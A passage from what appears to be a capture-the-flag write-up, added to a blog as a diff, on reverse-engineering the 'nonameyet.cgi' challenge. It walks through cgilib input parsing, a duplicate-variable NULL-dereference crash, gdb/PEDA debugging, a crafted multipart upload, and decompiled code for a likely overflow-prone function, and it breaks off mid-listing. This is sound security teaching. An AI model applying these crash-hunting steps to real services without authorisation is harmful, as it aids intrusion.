+</code></pre></div>
+<p>When looking at a CTF problem, you should always be asking yourself “What is happening with my input?” Most of the parsing happens right up front in the cgiInit() function. This function will read and parse CGI input and set up the s_cgi structure. This function first checks for the environment variable CONTENT_TYPE. CGI input is usually passed via environment variables and stdin from the webserver. If this environment variable is not set then the program will read variables from stdin.</p>
+
+<p>If the CONTENT_TYPE variable is set to “multipart/form-data” it will parse out a boundary condition from the variable and call off into the cgiReadMultipart() function before returning. If the CONTENT_TYPE variable is anything else, the program then looks for the REQUEST_METHOD and CONTENT_LENGTH environment variables.</p>
+
+<p>For a REQUEST_METHOD of “GET” the environment variable QUERY_STRING is parsed and for a REQUEST_METHOD of “POST” stdin is parsed. If none of these are specified then the cgiReadVariables() function will prompt for input from the command line. This is very handy for quick testing. The cgiInit() function will also parse cookie information. All of this was learned by reading the cgilib source code for cgiInit().</p>
+
+<p>We have five code paths for parsing our input: multipart, get, post, stdin, and cookies. All of these are standard in cgilib. Which code path should we explore first? Let’s start with the simplest form, no environment variables, and data parsed directly from stdin.</p>
+<div class='highlight'><pre><code class='java'><span class='n'>$</span> <span class='n'>python</span> <span class='o'>-</span><span class='n'>c</span> <span class='s'>&quot;print &#39;asdf=asdf&#39;&quot;</span> <span class='o'>|</span> <span class='o'>./</span><span class='n'>nonameyet</span><span class='o'>.</span><span class='na'>cgi</span>
+	<span class='o'>(</span><span class='n'>offline</span> <span class='nl'>mode:</span> <span class='n'>enter</span> <span class='n'>name</span><span class='o'>=</span><span class='n'>value</span> <span class='n'>pairs</span> <span class='n'>on</span> <span class='n'>standard</span> <span class='n'>input</span><span class='o'>)</span>
+	<span class='n'>Content</span><span class='o'>-</span><span class='nl'>type:</span> <span class='n'>text</span><span class='o'>/</span><span class='n'>html</span>
+
+	<span class='o'>&lt;</span><span class='n'>p</span><span class='o'>&gt;</span><span class='nl'>ERROR:</span> <span class='mi'>902</span><span class='o'>&lt;/</span><span class='n'>p</span><span class='o'>&gt;</span>
+</code></pre></div>
+<p>Here we just set a variable asdf = asdf and we are returned error 902, the same as if we passed in no input. Looking back to main() we can easily spot where “ERROR: 902” is printed inside of an else block. Look up to the if condition on that else block and we see that this is because photo = cgiGetFile((int)s_cgi, “photo”); returned NULL. Setting the photo variable from stdin also produces the same error. The cgiGetFile() call did not find a variable called photo registered in the s_cgi structure. There is another interesting behavior here if we set the same variable twice:</p>
+<div class='highlight'><pre><code class='java'><span class='n'>$</span> <span class='n'>python</span> <span class='o'>-</span><span class='n'>c</span> <span class='s'>&quot;print &#39;asdf=asdf\nasdf=asdf&#39;&quot;</span> <span class='o'>|</span> <span class='o'>./</span><span class='n'>nonameyet</span><span class='o'>.</span><span class='na'>cgi</span>
+	<span class='o'>(</span><span class='n'>offline</span> <span class='nl'>mode:</span> <span class='n'>enter</span> <span class='n'>name</span><span class='o'>=</span><span class='n'>value</span> <span class='n'>pairs</span> <span class='n'>on</span> <span class='n'>standard</span> <span class='n'>input</span><span class='o'>)</span>
+	<span class='n'>Segmentation</span> <span class='nf'>fault</span> <span class='o'>(</span><span class='n'>core</span> <span class='n'>dumped</span><span class='o'>)</span>
+</code></pre></div>
+<p>Crashes are usually really good in a CTF competition. Going into this with a debugger we find:</p>
+<div class='highlight'><pre><code class='java'><span class='n'>$</span> <span class='n'>gdb</span> <span class='o'>./</span><span class='n'>nonameyet</span><span class='o'>.</span><span class='na'>cgi</span>
+<span class='n'>Reading</span> <span class='n'>symbols</span> <span class='n'>from</span> <span class='o'>./</span><span class='n'>nonameyet</span><span class='o'>.</span><span class='na'>cgi</span><span class='o'>...(</span><span class='n'>no</span> <span class='n'>debugging</span> <span class='n'>symbols</span> <span class='n'>found</span><span class='o'>)...</span><span class='na'>done</span><span class='o'>.</span>
+<span class='n'>gdb</span><span class='o'>-</span><span class='n'>peda$</span> <span class='n'>r</span>
+<span class='n'>Starting</span> <span class='nl'>program:</span> <span class='o'>/</span><span class='n'>home</span><span class='o'>/</span><span class='n'>bool</span><span class='o'>/</span><span class='n'>nonameyet</span><span class='o'>.</span><span class='na'>cgi</span>
+<span class='o'>(</span><span class='n'>offline</span> <span class='nl'>mode:</span> <span class='n'>enter</span> <span class='n'>name</span><span class='o'>=</span><span class='n'>value</span> <span class='n'>pairs</span> <span class='n'>on</span> <span class='n'>standard</span> <span class='n'>input</span><span class='o'>)</span>
+<span class='n'>asdf</span><span class='o'>=</span><span class='n'>asdf</span>
+<span class='n'>asdf</span><span class='o'>=</span><span class='n'>asdf</span>
+
+<span class='n'>Program</span> <span class='n'>received</span> <span class='n'>signal</span> <span class='n'>SIGSEGV</span><span class='o'>,</span> <span class='n'>Segmentation</span> <span class='n'>fault</span><span class='o'>.</span>
+<span class='o'>[----------------------------------</span><span class='n'>registers</span><span class='o'>-----------------------------------]</span>
+<span class='nl'>EAX:</span> <span class='mh'>0x0</span>
+<span class='nl'>EBX:</span> <span class='mh'>0x4</span>
+<span class='nl'>ECX:</span> <span class='mh'>0xb7fcf448</span> <span class='o'>--&gt;</span> <span class='mh'>0x8050080</span> <span class='o'>--&gt;</span> <span class='mh'>0x66</span> <span class='o'>(</span><span class='sc'>&#39;f&#39;</span><span class='o'>)</span>
+<span class='nl'>EDX:</span> <span class='mh'>0x8050078</span> <span class='o'>(</span><span class='s'>&quot;asdf\nasdf&quot;</span><span class='o'>)</span>
+<span class='nl'>ESI:</span> <span class='mh'>0x0</span>
+<span class='nl'>EDI:</span> <span class='mh'>0x805008d</span> <span class='o'>--&gt;</span> <span class='mh'>0x0</span>
+<span class='nl'>EBP:</span> <span class='mh'>0xbffff668</span> <span class='o'>--&gt;</span> <span class='mh'>0xbffff698</span> <span class='o'>--&gt;</span> <span class='mh'>0xbffff708</span> <span class='o'>--&gt;</span> <span class='mh'>0x0</span>
+<span class='nl'>ESP:</span> <span class='mh'>0xbffff590</span> <span class='o'>--&gt;</span> <span class='mh'>0x0</span>
+<span class='nl'>EIP:</span> <span class='mh'>0x804bb5d</span> <span class='o'>(</span><span class='n'>mov</span>    <span class='n'>edx</span><span class='o'>,</span><span class='n'>DWORD</span> <span class='n'>PTR</span> <span class='o'>[</span><span class='n'>eax</span><span class='o'>+</span><span class='mh'>0x4</span><span class='o'>])</span>
+<span class='nl'>EFLAGS:</span> <span class='mh'>0x10206</span> <span class='o'>(</span><span class='n'>carry</span> <span class='n'>PARITY</span> <span class='n'>adjust</span> <span class='n'>zero</span> <span class='n'>sign</span> <span class='n'>trap</span> <span class='n'>INTERRUPT</span> <span class='n'>direction</span> <span class='n'>overflow</span><span class='o'>)</span>
+<span class='o'>[-------------------------------------</span><span class='n'>code</span><span class='o'>-------------------------------------]</span>
+   <span class='mh'>0x804bb52</span><span class='o'>:</span>   <span class='n'>shl</span>    <span class='n'>eax</span><span class='o'>,</span><span class='mh'>0x2</span>
+   <span class='mh'>0x804bb55</span><span class='o'>:</span>   <span class='n'>add</span>    <span class='n'>eax</span><span class='o'>,</span><span class='n'>DWORD</span> <span class='n'>PTR</span> <span class='o'>[</span><span class='n'>ebp</span><span class='o'>-</span><span class='mh'>0x84</span><span class='o'>]</span>
+   <span class='mh'>0x804bb5b</span><span class='o'>:</span>   <span class='n'>mov</span>    <span class='n'>eax</span><span class='o'>,</span><span class='n'>DWORD</span> <span class='n'>PTR</span> <span class='o'>[</span><span class='n'>eax</span><span class='o'>]</span>
+<span class='o'>=&gt;</span> <span class='mh'>0x804bb5d</span><span class='o'>:</span>   <span class='n'>mov</span>    <span class='n'>edx</span><span class='o'>,</span><span class='n'>DWORD</span> <span class='n'>PTR</span> <span class='o'>[</span><span class='n'>eax</span><span class='o'>+</span><span class='mh'>0x4</span><span class='o'>]</span>
+   <span class='mh'>0x804bb60</span><span class='o'>:</span>   <span class='n'>mov</span>    <span class='n'>eax</span><span class='o'>,</span><span class='n'>DWORD</span> <span class='n'>PTR</span> <span class='o'>[</span><span class='n'>ebp</span><span class='o'>-</span><span class='mh'>0x98</span><span class='o'>]</span>
+   <span class='mh'>0x804bb66</span><span class='o'>:</span>   <span class='n'>shl</span>    <span class='n'>eax</span><span class='o'>,</span><span class='mh'>0x2</span>
+   <span class='mh'>0x804bb69</span><span class='o'>:</span>   <span class='n'>add</span>    <span class='n'>eax</span><span class='o'>,</span><span class='n'>DWORD</span> <span class='n'>PTR</span> <span class='o'>[</span><span class='n'>ebp</span><span class='o'>-</span><span class='mh'>0x84</span><span class='o'>]</span>
+   <span class='mh'>0x804bb6f</span><span class='o'>:</span>   <span class='n'>mov</span>    <span class='n'>eax</span><span class='o'>,</span><span class='n'>DWORD</span> <span class='n'>PTR</span> <span class='o'>[</span><span class='n'>eax</span><span class='o'>]</span>
+<span class='o'>[------------------------------------</span><span class='n'>stack</span><span class='o'>-------------------------------------]</span>
+<span class='mi'>0000</span><span class='o'>|</span> <span class='mh'>0xbffff590</span> <span class='o'>--&gt;</span> <span class='mh'>0x0</span>
+<span class='mi'>0004</span><span class='o'>|</span> <span class='mh'>0xbffff594</span> <span class='o'>--&gt;</span> <span class='mh'>0x804d483</span> <span class='o'>(</span><span class='s'>&quot;%s\n%s&quot;</span><span class='o'>)</span>
+<span class='mi'>0008</span><span class='o'>|</span> <span class='mh'>0xbffff598</span> <span class='o'>--&gt;</span> <span class='mh'>0x8050058</span> <span class='o'>--&gt;</span> <span class='mh'>0x0</span>
+<span class='mi'>0012</span><span class='o'>|</span> <span class='mh'>0xbffff59c</span> <span class='o'>--&gt;</span> <span class='mh'>0x8050088</span> <span class='o'>--&gt;</span> <span class='mh'>0x8050050</span> <span class='o'>--&gt;</span> <span class='mh'>0x0</span>
+<span class='mi'>0016</span><span class='o'>|</span> <span class='mh'>0xbffff5a0</span> <span class='o'>--&gt;</span> <span class='mh'>0xb7fff55c</span> <span class='o'>--&gt;</span> <span class='mh'>0xb7fde000</span> <span class='o'>--&gt;</span> <span class='mh'>0x464c457f</span>
+<span class='mi'>0020</span><span class='o'>|</span> <span class='mh'>0xbffff5a4</span> <span class='o'>--&gt;</span> <span class='mh'>0x3</span>
+<span class='mi'>0024</span><span class='o'>|</span> <span class='mh'>0xbffff5a8</span> <span class='o'>--&gt;</span> <span class='mh'>0x0</span>
+<span class='mi'>0028</span><span class='o'>|</span> <span class='mh'>0xbffff5ac</span> <span class='o'>--&gt;</span> <span class='mh'>0xffffffff</span>
+<span class='o'>[------------------------------------------------------------------------------]</span>
+<span class='nl'>Legend:</span> <span class='n'>code</span><span class='o'>,</span> <span class='n'>data</span><span class='o'>,</span> <span class='n'>rodata</span><span class='o'>,</span> <span class='n'>value</span>
+<span class='n'>Stopped</span> <span class='nl'>reason:</span> <span class='n'>SIGSEGV</span>
+<span class='mh'>0x0804bb5d</span> <span class='n'>in</span> <span class='o'>??</span> <span class='o'>()</span>
+<span class='n'>gdb</span><span class='o'>-</span><span class='n'>peda$</span>
+</code></pre></div>
+<p>I should mention that I am using <a href="https://github.com/longld/peda">PEDA</a> with GDB. It makes exploit development tasks a lot easier than standard GDB. I encourage you to check it out and explore how it works. Anyway, this is a NULL pointer dereference crash. The register EAX is being dereferenced. EAX is NULL. As a result, the program sends a signal 11 or SIGSEGV and we terminate execution. The buggy code seems to be in cgilib/cgi.c on line 644 when they attempt to do:</p>
+<div class='highlight'><pre><code class='java'><span class='mi'>644</span><span class='o'>:</span>	<span class='n'>cgiDebugOutput</span> <span class='o'>(</span><span class='mi'>1</span><span class='o'>,</span> <span class='s'>&quot;%s: %s&quot;</span><span class='o'>,</span> <span class='n'>result</span><span class='o'>[</span><span class='n'>i</span><span class='o'>]-&gt;</span><span class='n'>name</span><span class='o'>,</span> <span class='n'>result</span><span class='o'>[</span><span class='n'>i</span><span class='o'>]-&gt;</span><span class='n'>value</span><span class='o'>);</span>
+</code></pre></div>
+<p>It looks to me like they used the incorrect index into the result array. There is another index counter called k used earlier in the code that accounts for duplicate variable name. My guess is that this line was simply copy and pasted from line 630 and the developers did not change ‘i’ to ‘k’. Either way, I am not sure if a web server would ever generate input to a CGI program like this, and unless we can somehow allocate the NULL address space on the remote server, this is not likely to be an interesting crash when solving the CTF problem. Interesting, but ultimately useless.</p>
+
+<p>Back to our problem. The photo variable is NULL. Looking back in cgi.c source code for cgiGetFile() it is easy to spot that this information comes from s_cgi-&gt;files. Ok, that makes sense. However, the only code path that sets this information is when we have a CONTENT_TYPE of “multipart/form-data”. This was discovered with a quick grep for “-&gt;files” in the cgilib source code to find something that writes to this variable. The one place this happens is in the cgiReadMultipart() function. Let’s jump into feeding this program multipart data.</p>
+
+<p>I used Wireshark to perform a packet capture on the data that was being sent by my browser when submitting a form to nonameyet.cgi. After all, the browser should already generate everything we need. With a quick copy and paste and setting up lines to end with \r\n instead of \n I now have the following setup to get multipart data parsed by the CGI program:</p>
+<div class='highlight'><pre><code class='java'><span class='n'>$</span> <span class='n'>export</span> <span class='n'>CONTENT_TYPE</span><span class='o'>=</span><span class='s'>&quot;Content-Type: multipart/form-data; boundary=---------------------------13141138687192&quot;</span>
+
+<span class='n'>$</span> <span class='n'>cat</span> <span class='n'>formdata</span>
+<span class='o'>-----------------------------</span><span class='mi'>13141138687192</span>
+<span class='n'>Content</span><span class='o'>-</span><span class='nl'>Disposition:</span> <span class='n'>form</span><span class='o'>-</span><span class='n'>data</span><span class='o'>;</span> <span class='n'>name</span><span class='o'>=</span><span class='s'>&quot;photo&quot;</span><span class='o'>;</span> <span class='n'>filename</span><span class='o'>=</span><span class='s'>&quot;test&quot;</span>
+<span class='n'>Content</span><span class='o'>-</span><span class='nl'>Type:</span> <span class='n'>application</span><span class='o'>/</span><span class='n'>octet</span><span class='o'>-</span><span class='n'>stream</span>
+
+<span class='n'>test</span>
+
+<span class='o'>-----------------------------</span><span class='mi'>13141138687192</span><span class='o'>--</span>
+</code></pre></div>
+<p>Remember each line ends with \r\n. After I set up the formdata file and my environment variable, let’s see if we can get past that error 902 output. I will also turn on the debug output with the debugger after breaking on main():</p>
+<div class='highlight'><pre><code class='java'><span class='n'>$</span> <span class='n'>gdb</span> <span class='o'>./</span><span class='n'>nonameyet</span><span class='o'>.</span><span class='na'>cgi</span>
+<span class='n'>Reading</span> <span class='n'>symbols</span> <span class='n'>from</span> <span class='o'>./</span><span class='n'>nonameyet</span><span class='o'>.</span><span class='na'>cgi</span><span class='o'>...(</span><span class='n'>no</span> <span class='n'>debugging</span> <span class='n'>symbols</span> <span class='n'>found</span><span class='o'>)...</span><span class='na'>done</span><span class='o'>.</span>
+<span class='n'>gdb</span><span class='o'>-</span><span class='n'>peda$</span> <span class='k'>break</span> <span class='o'>*</span><span class='mh'>0x0804906D</span>
+<span class='n'>Breakpoint</span> <span class='mi'>1</span> <span class='n'>at</span> <span class='mh'>0x804906d</span>
+<span class='n'>gdb</span><span class='o'>-</span><span class='n'>peda$</span> <span class='n'>set</span> <span class='n'>args</span> <span class='o'>&lt;</span> <span class='n'>formdata</span>
+<span class='n'>gdb</span><span class='o'>-</span><span class='n'>peda$</span> <span class='n'>r</span>
+<span class='n'>Starting</span> <span class='nl'>program:</span> <span class='o'>/</span><span class='n'>home</span><span class='o'>/</span><span class='n'>bool</span><span class='o'>/</span><span class='n'>nonameyet</span><span class='o'>.</span><span class='na'>cgi</span> <span class='o'>&lt;</span> <span class='n'>formdata</span>
+<span class='n'>Breakpoint</span> <span class='mi'>1</span><span class='o'>,</span> <span class='mh'>0x0804906d</span> <span class='n'>in</span> <span class='o'>??</span> <span class='o'>()</span>
+<span class='n'>gdb</span><span class='o'>-</span><span class='n'>peda$</span> <span class='n'>set</span> <span class='o'>{</span><span class='kt'>int</span><span class='o'>}</span><span class='mh'>0x804F0DC</span><span class='o'>=</span><span class='mi'>1000</span>
+<span class='n'>gdb</span><span class='o'>-</span><span class='n'>peda$</span> <span class='n'>c</span>
+<span class='n'>Continuing</span><span class='o'>.</span>
+<span class='n'>Content</span><span class='o'>-</span><span class='nl'>Type:</span> <span class='n'>Content</span><span class='o'>-</span><span class='nl'>Type:</span> <span class='n'>multipart</span><span class='o'>/</span><span class='n'>form</span><span class='o'>-</span><span class='n'>data</span><span class='o'>;</span> <span class='n'>boundary</span><span class='o'>=---------------------------</span><span class='mi'>13141138687192</span>
+<span class='n'>Read</span> <span class='n'>line</span> <span class='err'>&#39;</span><span class='o'>-----------------------------</span><span class='mi'>13141138687192</span><span class='err'>&#39;</span>
+<span class='n'>Read</span> <span class='n'>line</span> <span class='err'>&#39;</span><span class='n'>Content</span><span class='o'>-</span><span class='nl'>Disposition:</span> <span class='n'>form</span><span class='o'>-</span><span class='n'>data</span><span class='o'>;</span> <span class='n'>name</span><span class='o'>=</span><span class='s'>&quot;photo&quot;</span><span class='o'>;</span> <span class='n'>filename</span><span class='o'>=</span><span class='s'>&quot;test&quot;</span><span class='err'>&#39;</span>
+<span class='n'>Found</span> <span class='n'>field</span> <span class='n'>name</span> <span class='n'>photo</span>
+<span class='n'>Found</span> <span class='n'>filename</span> <span class='n'>test</span>
+<span class='n'>Read</span> <span class='n'>line</span> <span class='err'>&#39;</span><span class='n'>Content</span><span class='o'>-</span><span class='nl'>Type:</span> <span class='n'>application</span><span class='o'>/</span><span class='n'>octet</span><span class='o'>-</span><span class='n'>stream</span><span class='err'>&#39;</span>
+<span class='n'>Found</span> <span class='n'>mime</span> <span class='n'>type</span> <span class='n'>application</span><span class='o'>/</span><span class='n'>octet</span><span class='o'>-</span><span class='n'>stream</span>
+<span class='n'>Read</span> <span class='n'>line</span> <span class='err'>&#39;&#39;</span>
+<span class='n'>Wrote</span> <span class='nf'>photo</span> <span class='o'>(</span><span class='n'>test</span><span class='o'>)</span> <span class='n'>to</span> <span class='nl'>file:</span> <span class='o'>/</span><span class='n'>tmp</span><span class='o'>/</span><span class='n'>cgilibWFDOKJ</span>
+<span class='n'>Read</span> <span class='n'>line</span> <span class='err'>&#39;</span><span class='o'>-----------------------------</span><span class='mi'>13141138687192</span><span class='err'>&#39;</span>
+<span class='n'>photo</span> <span class='n'>found</span> <span class='n'>as</span> <span class='n'>test</span>
+<span class='n'>Content</span><span class='o'>-</span><span class='nl'>type:</span> <span class='n'>text</span><span class='o'>/</span><span class='n'>html</span>
+<span class='nl'>Cookie:</span> <span class='n'>YmFzZQA</span><span class='o'>=</span>
+
+<span class='o'>&lt;</span><span class='n'>meta</span> <span class='n'>http</span><span class='o'>-</span><span class='n'>equiv</span><span class='o'>=</span><span class='err'>&#39;</span><span class='n'>refresh</span><span class='err'>&#39;</span> <span class='n'>content</span><span class='o'>=</span><span class='err'>&#39;</span><span class='mi'>0</span><span class='o'>;</span><span class='n'>url</span><span class='o'>=../</span><span class='n'>thanks</span><span class='o'>.</span><span class='na'>php</span><span class='err'>&#39;</span><span class='o'>&gt;[</span><span class='n'>Inferior</span> <span class='mi'>1</span> <span class='o'>(</span><span class='n'>process</span> <span class='mi'>7579</span><span class='o'>)</span> <span class='n'>exited</span> <span class='n'>normally</span><span class='o'>]</span>
+</code></pre></div>
+<p>That looks pretty good! In truth, it took a bit of playing around to get to this point. Now we have everything specified in our form being read. The file contents were written and parsed and if we look in the /photos directory we see a file named base with the contents test:</p>
+<div class='highlight'><pre><code class='java'><span class='n'>$</span> <span class='n'>ls</span> <span class='n'>photos</span><span class='o'>/</span>
+<span class='n'>base</span>
+<span class='n'>$</span> <span class='n'>cat</span> <span class='n'>photos</span><span class='o'>/</span><span class='n'>base</span>
+<span class='n'>test</span>
+</code></pre></div>
+<p>Where is the bug? If you look back up in the main() function you will see a subroutine I labeled “interesting”. The only way to get to this function is to have a valid photo returned from cgiGetFile(). Here is the decompiled source code for the interesting function:</p>
+<div class='highlight'><pre><code class='java'><span class='n'>unsigned</span> <span class='kt'>int</span> <span class='n'>__usercall</span> <span class='n'>interesting</span><span class='err'>@</span><span class='o'>&lt;</span><span class='n'>eax</span><span class='o'>&gt;(</span><span class='kt'>int</span> <span class='n'>edi0</span><span class='err'>@</span><span class='o'>&lt;</span><span class='n'>edi</span><span class='o'>&gt;,</span> <span class='kt'>char</span> <span class='o'>*</span><span class='n'>a2</span><span class='err'>@</span><span class='o'>&lt;</span><span class='n'>esi</span><span class='o'>&gt;,</span> <span class='kt'>int</span> <span class='n'>a1</span><span class='o'>)</span>
+<span class='o'>{</span>
+  <span class='n'>unsigned</span> <span class='kt'>int</span> <span class='n'>result</span><span class='o'>;</span> <span class='c1'>// eax@1</span>
+  <span class='kt'>void</span> <span class='o'>*</span><span class='n'>v4</span><span class='o'>;</span> <span class='c1'>// esp@2</span>
+  <span class='kt'>char</span> <span class='n'>v5</span><span class='o'>;</span> <span class='c1'>// bl@3</span>
+  <span class='kt'>int</span> <span class='n'>v6</span><span class='o'>;</span> <span class='c1'>// edx@3</span>
+  <span class='kt'>int</span> <span class='n'>v7</span><span class='o'>;</span> <span class='c1'>// ecx@3</span>
+  <span class='kt'>void</span> <span class='o'>*</span><span class='n'>v8</span><span class='o'>;</span> <span class='c1'>// esp@4</span>
+  <span class='kt'>int</span> <span class='n'>v9</span><span class='o'>;</span> <span class='c1'>// ecx@7</span>
+  <span class='n'>unsigned</span> <span class='kt'>int</span> <span class='n'>v10</span><span class='o'>;</span> <span class='c1'>// ecx@8</span>
+  <span class='kt'>void</span> <span class='o'>*</span><span class='n'>v11</span><span class='o'>;</span> <span class='c1'>// edi@9</span>
+  <span class='n'>unsigned</span> <span class='kt'>int</span> <span class='n'>v12</span><span class='o'>;</span> <span class='c1'>// ecx@11</span>
+  <span class='kt'>void</span> <span class='o'>*</span><span class='n'>v13</span><span class='o'>;</span> <span class='c1'>// edi@12</span>
+  <span class='n'>unsigned</span> <span class='kt'>int</span> <span class='n'>v14</span><span class='o'>;</span> <span class='c1'>// ecx@14</span>
+  <span class='kt'>void</span> <span class='o'>*</span><span class='n'>v15</span><span class='o'>;</span> <span class='c1'>// edi@15</span>
+  <span class='n'>unsigned</span> <span class='kt'>int</span> <span class='n'>v16</span><span class='o'>;</span> <span class='c1'>// ecx@17</span>
+  <span class='kt'>void</span> <span class='o'>*</span><span class='n'>v17</span><span class='o'>;</span> <span class='c1'>// edi@18</span>
+  <span class='n'>unsigned</span> <span class='kt'>int</span> <span class='n'>v18</span><span class='o'>;</span> <span class='c1'>// ecx@20</span>
+  <span class='kt'>void</span> <span class='o'>*</span><span class='n'>v19</span><span class='o'>;</span> <span class='c1'>// edi@21</span>
+  <span class='kt'>int</span> <span class='n'>v20</span><span class='o'>;</span> <span class='c1'>// eax@25</span>
+  <span class='kt'>int</span> <span class='n'>v21</span><span class='o'>;</span> <span class='c1'>// [sp+0h] [bp-20h]@2</span>
+  <span class='n'>unsigned</span> <span class='kt'>int</span> <span class='n'>counter_1</span><span class='o'>;</span> <span class='c1'>// [sp+8h] [bp-18h]@1</span>
+  <span class='kd'>const</span> <span class='kt'>void</span> <span class='o'>*</span><span class='n'>esp_ptr</span><span class='o'>;</span> <span class='c1'>// [sp+Ch] [bp-14h]@2</span>
+  <span class='kt'>int</span> <span class='n'>file_name_size</span><span class='o'>;</span> <span class='c1'>// [sp+10h] [bp-10h]@2</span>
+  <span class='kt'>int</span> <span class='n'>filename</span><span class='o'>;</span> <span class='c1'>// [sp+14h] [bp-Ch]@2</span>
+  <span class='kt'>int</span> <span class='n'>type_mult_2</span><span class='o'>;</span> <span class='c1'>// [sp+18h] [bp-8h]@2</span>
+  <span class='kt'>int</span> <span class='n'>counter</span><span class='o'>;</span> <span class='c1'>// [sp+1Ch] [bp-4h]@1</span>
+
+  <span class='n'>result</span> <span class='o'>=</span> <span class='mi'>0</span><span class='o'>;</span>
+  <span class='n'>counter</span> <span class='o'>=</span> <span class='mi'>0</span><span class='o'>;</span>
+  <span class='n'>counter_1</span> <span class='o'>=</span> <span class='mi'>0</span><span class='o'>;</span>
+  <span class='k'>if</span> <span class='o'>(</span> <span class='n'>a1</span> <span class='o'>)</span>
+  <span class='o'>{</span>
+    <span class='n'>file_name_size</span> <span class='o'>=</span> <span class='o'>*(</span><span class='n'>_DWORD</span> <span class='o'>*)(</span><span class='n'>a1</span> <span class='o'>+</span> <span class='mi'>4</span><span class='o'>);</span>
+    <span class='n'>type_mult_2</span> <span class='o'>=</span> <span class='mi'>2</span> <span class='o'>*</span> <span class='n'>file_name_size</span><span class='o'>;</span>
+    <span class='n'>v4</span> <span class='o'>=</span> <span class='n'>alloca</span><span class='o'>(</span><span class='mi'>2</span> <span class='o'>*</span> <span class='n'>file_name_size</span><span class='o'>);</span>
+    <span class='n'>esp_ptr</span> <span class='o'>=</span> <span class='o'>&amp;</span><span class='n'>v21</span><span class='o'>;</span>
+    <span class='n'>filename</span> <span class='o'>=</span> <span class='o'>*(</span><span class='n'>_DWORD</span> <span class='o'>*)</span><span class='n'>a1</span><span class='o'>;</span>
+    <span class='k'>while</span> <span class='o'>(</span> <span class='mi'>1</span> <span class='o'>)</span>
+    <span class='o'>{</span>
+      <span class='k'>while</span> <span class='o'>(</span> <span class='mi'>1</span> <span class='o'>)</span>
+      <span class='o'>{</span>
+        <span class='n'>v5</span> <span class='o'>=</span> <span class='o'>*(</span><span class='n'>_BYTE</span> <span class='o'>*)(</span><span class='n'>counter</span> <span class='o'>+</span> <span class='n'>filename</span><span class='o'>);</span>
+        <span class='n'>v6</span> <span class='o'>=</span> <span class='n'>counter</span><span class='o'>++</span> <span class='o'>+</span> <span class='n'>filename</span> <span class='o'>+</span> <span class='mi'>1</span><span class='o'>;</span>
+        <span class='n'>v7</span> <span class='o'>=</span> <span class='n'>type_mult_2</span><span class='o'>;</span>
+        <span class='k'>if</span> <span class='o'>(</span> <span class='n'>type_mult_2</span> <span class='o'>&lt;=</span> <span class='o'>(</span><span class='n'>signed</span> <span class='kt'>int</span><span class='o'>)</span><span class='n'>counter_1</span> <span class='o'>)</span>
+        <span class='o'>{</span>
+          <span class='n'>v8</span> <span class='o'>=</span> <span class='n'>alloca</span><span class='o'>(</span><span class='n'>type_mult_2</span><span class='o'>);</span>
+          <span class='n'>qmemcpy</span><span class='o'>(&amp;</span><span class='n'>v21</span><span class='o'>,</span> <span class='o'>&amp;</span><span class='n'>v21</span><span class='o'>,</span> <span class='n'>type_mult_2</span><span class='o'>);</span>
+          <span class='n'>a2</span> <span class='o'>=</span> <span class='o'>(</span><span class='kt'>char</span> <span class='o'>*)&amp;</span><span class='n'>v21</span> <span class='o'>+</span> <span class='n'>v7</span><span class='o'>;</span>
+          <span class='n'>edi0</span> <span class='o'>=</span> <span class='o'>(</span><span class='kt'>int</span><span class='o'>)((</span><span class='kt'>char</span> <span class='o'>*)&amp;</span><span class='n'>v21</span> <span class='o'>+</span> <span class='n'>v7</span><span class='o'>);</span>
+          <span class='n'>esp_ptr</span> <span class='o'>=</span> <span class='o'>&amp;</span><span class='n'>v21</span><span class='o'>;</span>
+          <span class='n'>type_mult_2</span> <span class='o'>*=</span> <span class='mi'>2</span><span class='o'>;</span>
+        <span class='o'>}</span>
+        <span class='k'>if</span> <span class='o'>(</span> <span class='n'>v5</span> <span class='o'>!=</span> <span class='sc'>&#39;%&#39;</span> <span class='o'>||</span> <span class='o'>*(</span><span class='n'>_BYTE</span> <span class='o'>*)(</span><span class='n'>v6</span> <span class='o'>+</span> <span class='mi'>4</span><span class='o'>)</span> <span class='o'>!=</span> <span class='sc'>&#39;%&#39;</span> <span class='o'>)</span>
+        <span class='o'>{</span>
+          <span class='o'>*((</span><span class='n'>_BYTE</span> <span class='o'>*)</span><span class='n'>esp_ptr</span> <span class='o'>+</span> <span class='n'>counter_1</span><span class='o'>++)</span> <span class='o'>=</span> <span class='n'>v5</span><span class='o'>;</span>
+          <span class='k'>goto</span> <span class='n'>LABEL_24</span><span class='o'>;</span>
+        <span class='o'>}</span>
+        <span class='n'>v9</span> <span class='o'>=</span> <span class='o'>*(</span><span class='n'>_DWORD</span> <span class='o'>*)</span><span class='n'>v6</span><span class='o'>;</span>
+        <span class='n'>v6</span> <span class='o'>+=</span> <span class='mi'>5</span><span class='o'>;</span>
+        <span class='n'>counter</span> <span class='o'>+=</span> <span class='mi'>5</span><span class='o'>;</span>
+        <span class='k'>if</span> <span class='o'>(</span> <span class='n'>v9</span> <span class='o'>!=</span> <span class='err'>&#39;</span><span class='n'>rneG</span><span class='err'>&#39;</span> <span class='o'>)</span>
+          <span class='k'>break</span><span class='o'>;</span>
+        <span class='n'>v10</span> <span class='o'>=</span> <span class='o'>*(</span><span class='n'>_DWORD</span> <span class='o'>*)(</span><span class='n'>a1</span> <span class='o'>+</span> <span class='mi'>12</span><span class='o'>);</span>
+        <span class='n'>a2</span> <span class='o'>=</span> <span class='o'>*(</span><span class='kt'>char</span> <span class='o'>**)(</span><span class='n'>a1</span> <span class='o'>+</span> <span class='mi'>8</span><span class='o'>);</span>
+        <span class='k'>if</span> <span class='o'>(</span> <span class='n'>a2</span> <span class='o'>)</span>
+        <span class='o'>{</span>
+          <span class='n'>v11</span> <span class='o'>=</span> <span class='o'>(</span><span class='kt'>char</span> <span class='o'>*)</span><span class='n'>esp_ptr</span> <span class='o'>+</span> <span class='n'>counter_1</span><span class='o'>;</span>
+          <span class='n'>counter_1</span> <span class='o'>+=</span> <span class='n'>v10</span><span class='o'>;</span>
+          <span class='n'>qmemcpy</span><span class='o'>(</span><span class='n'>v11</span><span class='o'>,</span> <span class='n'>a2</span><span class='o'>,</span> <span class='n'>v10</span><span class='o'>);</span>
+          <span class='n'>a2</span> <span class='o'>+=</span> <span class='n'>v10</span><span class='o'>;</span>
+          <span class='n'>edi0</span> <span class='o'>=</span> <span class='o'>(</span><span class='kt'>int</span><span class='o'>)((</span><span class='kt'>char</span> <span class='o'>*)</span><span class='n'>v11</span> <span class='o'>+</span> <span class='n'>v10</span><span class='o'>);</span>
+<span class='nl'>LABEL_24:</span>
